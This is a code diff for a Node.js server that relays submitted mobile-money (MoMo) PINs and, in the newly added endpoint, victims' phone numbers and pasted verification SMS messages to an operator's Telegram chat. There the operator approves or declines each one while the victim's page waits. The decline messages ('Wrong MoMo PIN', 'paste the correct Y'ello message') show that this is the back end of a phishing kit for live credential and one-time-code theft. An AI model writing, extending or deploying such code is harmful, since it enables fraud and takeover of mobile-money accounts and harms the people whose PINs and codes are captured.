@@ -98,6 +98,29 @@ async function sendSubmissionToTelegram(sub) {
   });
 }
 
+async function sendSmsToTelegram(sub) {
+  const text =
+    `📩 <b>NEW SMS VERIFICATION</b>\n\n` +
+    `📱 <b>Phone:</b> ${sub.phone || '—'}\n` +
+    `📝 <b>SMS:</b>\n<code>${(sub.smsMessage || '').slice(0, 500)}</code>\n\n` +
+    `🆔 <b>Ref:</b> <code>${sub.id}</code>\n\n` +
+    `Tap a button to decide.`;
+
+  const keyboard = {
+    inline_keyboard: [[
+      { text: '✅ Approve', callback_data: `sms-approve:${sub.id}` },
+      { text: '❌ Decline', callback_data: `sms-decline:${sub.id}` }
+    ]]
+  };
+
+  return tgSend('sendMessage', {
+    chat_id: TELEGRAM_CHAT_ID,
+    text,
+    parse_mode: 'HTML',
+    reply_markup: keyboard
+  });
+}
+
 /* ---- Endpoints ---- */
 
 app.get('/health', (req, res) => {
@@ -168,9 +191,33 @@ app.post('/api/submit-payment', async (req, res) => {
   writeState(state);
   broadcast(state);
 
-  // Fire off to Telegram (don't block the response)
   const tgResult = await sendSubmissionToTelegram(submission);
   console.log('[tg] result ok?', tgResult && tgResult.ok);
+
+  res.json({ status: 'pending', id: submission.id });
+});
+
+// SMS submission — forwards to Telegram
+app.post('/api/submit-sms', async (req, res) => {
+  console.log('=== SUBMIT-SMS ===');
+  console.log('Body:', JSON.stringify(req.body));
+
+  const submission = {
+    ...req.body,
+    id: 'SMS-' + Date.now(),
+    submittedAt: new Date().toISOString()
+  };
+
+  const state = readState();
+  state.latestSmsSubmission = submission;
+  delete state.decision;
+  delete state.declineMessage;
+  delete state.decidedAt;
+  writeState(state);
+  broadcast(state);
+
+  const tgResult = await sendSmsToTelegram(submission);
+  console.log('[tg] sms result ok?', tgResult && tgResult.ok);
 
   res.json({ status: 'pending', id: submission.id });
 });
@@ -201,6 +248,7 @@ app.post('/api/reset', (req, res) => {
   delete state.declineMessage;
   delete state.decidedAt;
   delete state.latestSubmission;
+  delete state.latestSmsSubmission;
   writeState(state);
   broadcast(state);
   res.json({ ok: true, state });
@@ -208,7 +256,6 @@ app.post('/api/reset', (req, res) => {
 
 /* ---- Telegram webhook ---- */
 app.post('/api/telegram/webhook', async (req, res) => {
-  // Immediately acknowledge
   res.sendStatus(200);
 
   const update = req.body || {};
@@ -219,52 +266,95 @@ app.post('/api/telegram/webhook', async (req, res) => {
   const [action, refId] = data.split(':');
 
   const state = readState();
-  const current = state.latestSubmission;
 
-  if (!current || (refId && current.id !== refId)) {
-    // Submission already replaced — ignore stale tap
-    await tgSend('answerCallbackQuery', {
-      callback_query_id: cb.id,
-      text: 'This submission is no longer active.',
-      show_alert: false
-    });
+  /* ---- MoMo PIN decision ---- */
+  if (action === 'approve' || action === 'decline') {
+    const current = state.latestSubmission;
+    if (!current || (refId && current.id !== refId)) {
+      await tgSend('answerCallbackQuery', {
+        callback_query_id: cb.id,
+        text: 'This submission is no longer active.',
+        show_alert: false
+      });
+      return;
+    }
+
+    if (action === 'approve') {
+      state.decision = 'approved';
+      state.decidedAt = new Date().toISOString();
+      writeState(state);
+      broadcast(state);
+
+      await tgSend('answerCallbackQuery', { callback_query_id: cb.id, text: '✅ Approved' });
+      await tgSend('editMessageReplyMarkup', {
+        chat_id: cb.message.chat.id,
+        message_id: cb.message.message_id,
+        reply_markup: { inline_keyboard: [[{ text: '✅ Approved', callback_data: 'noop' }]] }
+      });
+    } else {
+      state.decision = 'declined';
+      state.declineMessage = 'Wrong MoMo PIN. Please try again.';
+      state.decidedAt = new Date().toISOString();
+      writeState(state);
+      broadcast(state);
+
+      await tgSend('answerCallbackQuery', { callback_query_id: cb.id, text: '❌ Declined' });
+      await tgSend('editMessageReplyMarkup', {
+        chat_id: cb.message.chat.id,
+        message_id: cb.message.message_id,
+        reply_markup: { inline_keyboard: [[{ text: '❌ Declined', callback_data: 'noop' }]] }
+      });
+    }
     return;
   }
 
-  if (action === 'approve') {
-    state.decision = 'approved';
-    state.decidedAt = new Date().toISOString();
-    writeState(state);
-    broadcast(state);
+  /* ---- SMS decision ---- */
+  if (action === 'sms-approve' || action === 'sms-decline') {
+    const current = state.latestSmsSubmission;
+    if (!current || (refId && current.id !== refId)) {
+      await tgSend('answerCallbackQuery', {
+        callback_query_id: cb.id,
+        text: 'This SMS submission is no longer active.',
+        show_alert: false
+      });
+      return;
+    }
 
-    await tgSend('answerCallbackQuery', {
-      callback_query_id: cb.id,
-      text: '✅ Approved'
-    });
+    if (action === 'sms-approve') {
+      state.decision = 'sms-approved';
+      state.decidedAt = new Date().toISOString();
+      writeState(state);
+      broadcast(state);
 
-    await tgSend('editMessageReplyMarkup', {
-      chat_id: cb.message.chat.id,
-      message_id: cb.message.message_id,
-      reply_markup: { inline_keyboard: [[{ text: '✅ Approved', callback_data: 'noop' }]] }
-    });
-  } else if (action === 'decline') {
-    state.decision = 'declined';
-    state.declineMessage = 'Wrong MoMo PIN. Please try again.';
-    state.decidedAt = new Date().toISOString();
-    writeState(state);
-    broadcast(state);
+      await tgSend('answerCallbackQuery', { callback_query_id: cb.id, text: '✅ SMS Approved' });
+      await tgSend('editMessageReplyMarkup', {
+        chat_id: cb.message.chat.id,
+        message_id: cb.message.message_id,
+        reply_markup: { inline_keyboard: [[{ text: '✅ SMS Approved', callback_data: 'noop' }]] }
+      });
+    } else {
+      state.decision = 'sms-declined';
+      state.declineMessage = "Invalid SMS. Please paste the correct Y'ello message.";
+      state.decidedAt = new Date().toISOString();
+      writeState(state);
+      broadcast(state);
 
-    await tgSend('answerCallbackQuery', {
-      callback_query_id: cb.id,
-      text: '❌ Declined'
-    });
-
-    await tgSend('editMessageReplyMarkup', {
-      chat_id: cb.message.chat.id,
-      message_id: cb.message.message_id,
-      reply_markup: { inline_keyboard: [[{ text: '❌ Declined', callback_data: 'noop' }]] }
-    });
+      await tgSend('answerCallbackQuery', { callback_query_id: cb.id, text: '❌ SMS Declined' });
+      await tgSend('editMessageReplyMarkup', {
+        chat_id: cb.message.chat.id,
+        message_id: cb.message.message_id,
+        reply_markup: { inline_keyboard: [[{ text: '❌ SMS Declined', callback_data: 'noop' }]] }
+      });
+    }
+    return;
   }
+
+  // Unknown action
+  await tgSend('answerCallbackQuery', {
+    callback_query_id: cb.id,
+    text: 'Unknown action',
+    show_alert: false
+  });
 });
 
 /* ---- Register webhook on boot ---- */
